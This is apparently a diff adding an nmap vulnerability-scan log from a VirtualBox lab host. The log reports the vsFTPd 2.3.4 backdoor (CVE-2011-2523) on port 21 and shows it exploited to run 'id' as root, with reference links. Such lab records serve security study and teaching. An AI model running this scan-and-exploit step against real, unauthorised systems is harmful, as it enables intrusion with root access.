@@ -1,0 +1,28 @@
+$ sudo nmap --script vuln -p 21 192.168.56.4
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-30 16:26 EDT
+Nmap scan report for 192.168.56.4
+Host is up (0.0011s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523
+|           BID:48539
+|     vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|       https://www.securityfocus.com/bid/48539
+|_    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+MAC Address: 08:00:27:C9:56:D0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds
